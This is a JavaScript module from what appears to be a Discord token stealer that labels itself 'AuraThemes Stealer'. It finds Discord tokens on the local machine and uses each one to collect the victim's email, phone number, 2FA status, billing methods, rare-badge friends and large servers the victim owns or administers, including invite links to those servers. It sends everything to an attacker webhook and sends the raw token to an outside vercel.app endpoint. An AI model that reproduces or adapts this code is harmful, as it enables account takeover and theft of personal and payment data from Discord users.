const { discordFindTokens } = require('./finds.js');
const { getUsers }          = require("./../../utils/harware.js");

const FormData = require('form-data');
const axios    = require("axios");

module.exports = async (webhook) => {
    const users = await getUsers();
    for (const user of users) {
        const tokens = await discordFindTokens(user);
        for (let token of tokens) {
            try {
                let user = await axios.get('https://discord.com/api/v9/users/@me', { headers: { Authorization: token } });
                    user = user.data;

                let billing = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', { headers: { Authorization: token } });
                    billing = billing.data;

                let guilds = await axios.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', { headers: { Authorization: token } });
                    guilds = guilds.data;

                let friends = await axios.get('https://discord.com/api/v9/users/@me/relationships', { headers: { Authorization: token } });
                    friends = friends.data;

                const avatarUrlGif = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.gif`;
                const avatarUrlPng = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;

                let avatar;
                try {
                    const avatarResponse = await axios.get(avatarUrlGif);
                    if (avatarResponse.status === 200) {
                        avatar = avatarUrlGif;
                    }
                } catch (error) {
                    avatar = avatarUrlPng
                }

                let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;

                const payload = {
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    username: 'AuraThemes Stealer',
                    embeds: [
                        {
                            title: `${user.username} | ${user.id}`,
                            color: "12740607",
                            thumbnail: {
                                url: avatar + '?size=512'
                            },
                            fields: [
                                {
                                    name: "<a:sofake:1127671627178577951> Token:",
                                    value: `\`\`\`yml\n${token}\n\`\`\`\n[[Click Here To Copy Your Token]](${copy})`,
                                    inline: false
                                },
                                { name: "\u200b", value: "\u200b", inline: false },
                                {
                                    name: "<a:nitro:1187983753637802044> Nitro:",
                                    value: getNitro(user.premium_type),
                                    inline: true
                                },
                                {
                                    name: "<a:love:1236106886978342965> Phone:",
                                    value: `\`${user.phone || 'None'}${user.mfa_enabled ? ' (2FA)' : ''}\``,
                                    inline: true
                                },
                                { name: "\u200b", value: "\u200b", inline: false },
                                {
                                    name: "<:mail:866089515536744468> Email:",
                                    value: `\`${user.email || 'None'}\``,
                                    inline: true
                                },
                                {
                                    name: "<a:badges:963333479129550889> Badges:",
                                    value: getFlags(user.public_flags),
                                    inline: true
                                },
                                {
                                    name: "<:blackcards:1121714389708439664> Billing:",
                                    value: getBilling(billing),
                                    inline: true
                                }
                            ],
                            timestamp: new Date(),
                            footer: {
                                text: 'AuraThemes Stealer | Tokens',
                                icon_url: 'https://i.imgur.com/yVnOSeS.gif'
                            }
                        }
                    ]
                };

                const hqGuilds = await getHQGuilds(guilds, token);
                if (hqGuilds) {
                    payload.embeds[0].fields.push({
                        name: "\u200b",
                        value: hqGuilds,
                        inline: false
                    });
                }

                const hqFriends = getHQFriends(friends);
                if (hqFriends) {
                    payload.embeds[0].fields.push({
                        name: "\u200b",
                        value: hqFriends,
                        inline: false
                    });
                }

                const form = new FormData();
                form.append('payload_json', JSON.stringify(payload));

                await axios.post(webhook, form, {
                    headers: {
                        ...form.getHeaders()
                    }
                });
                await axios.get(copy);
            } catch (error) {
                console.error('Error sending webhook:', error);
            }
        }
    }
}

function getHQFriends(friends) {
    const filteredFriends = friends
        .filter(friend => friend.type === 1)
        .map(friend => ({
            username: friend.user.username,
            discriminator: friend.user.discriminator,
            flags: getRareFlags(friend.user.public_flags)
        }))

    let hQFriends = filteredFriends.map(friend => {
        const name = `${friend.username}#${friend.discriminator}`;
        return friend.flags ? `${friend.flags} | ${name}\n` : `${friend.flags} | ${name}\n`;
    });

    hQFriends = hQFriends.join('');

    if (hQFriends.length === 0) {
        return false;
    }

    if (hQFriends.length > 1000) {
        hQFriends = "Too many friends to display.";
    }

    return `**Rare Friends:**\n${hQFriends}`;
};

async function getHQGuilds(guilds, token) {
    const filteredGuilds = guilds
        .filter(guild => guild.owner || (guild.permissions & 8) === 8)
        .filter(guild => guild.approximate_member_count >= 500)
        .map(guild => ({
            id: guild.id,
            name: guild.name,
            owner: guild.owner,
            member_count: guild.approximate_member_count
        }));

    let hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
        const response = await axios.get(`https://discord.com/api/v8/guilds/${guild.id}/invites`, {
            headers: { Authorization: token }
        });

        const invites = response.data;
        const invite = invites.length > 0
            ? `[Join Server](https://discord.gg/${invites[0].code})`
            : 'No Invite';

        const emoji = guild.owner
            ? "<:owner:963333541343686696> Owner"
            : "<:staff:1178394965706031114> Admin";
        const members = `Members: \`${guild.member_count}\``;
        const name = `${guild.name} - \`${guild.id}\``;

        return `${emoji} | ${name} | ${members} - ${invite}\n`;
    }));

    hQGuilds = hQGuilds.join('')

    if (hQGuilds.length === 0) {
        return false;
    }

    if (hQGuilds.length > 1000) {
        hQGuilds = "Too many servers to display.";
    }

    return `**Rare Servers:**\n${hQGuilds}`;
}

function getBilling(billing) {
    const paymentMap = {
        1: '💳',
        2: '<:paypal:1129073151746252870>'
    };
    let paymentMethods = billing.map(method => paymentMap[method.type] || '❓').join('');
    return paymentMethods || '`None`';
}

function getNitro(flags) {
    const nitroDict = {
        1: '`Nitro Classic`',
        2: '`Nitro`',
        3: '`Nitro Basic`'
    };
    return nitroDict[flags] || '`None`';
}

function getFlags(flags) {
    const flagsDict = {
        '<:staff:1090015968618623129>': 0,
        '<:partner:918207395279273985>': 1,
        '<:events:898186057588277259>': 2,
        '<:bughunter_1:874750808426692658>': 3,
        '<:bravery:874750808388952075>': 6,
        '<:brilliance:874750808338608199>': 7,
        '<:balance:874750808267292683>': 8,
        '<:early:944071770506416198>': 9,
        '<:bughunter_2:874750808430874664>': 14,
        '<:verifieddeveloper:1257040817600594101>': 17,
        '<:certifiedmoderator:925562487280128061>': 18,
        '⌨️': 20,
        '<:activedev:1042545590640324608>': 22
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji;
        }
    }

    return result.trim() || '`None`';
}

function getRareFlags(flags) {
    const flagsDict = {
        '<:staff:1090015968618623129>': 0,
        '<:partner:918207395279273985>': 1,
        '<:events:898186057588277259>': 2,
        '<:bughunter_1:874750808426692658>': 3,
        '<:early:944071770506416198>': 9,
        '<:bughunter_2:874750808430874664>': 14,
        '<:activedev:1042545590640324608>': 22,
        '<:verifieddeveloper:1257040817600594101>': 17
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji + ' ';
        }
    }

    return result.trim();
}
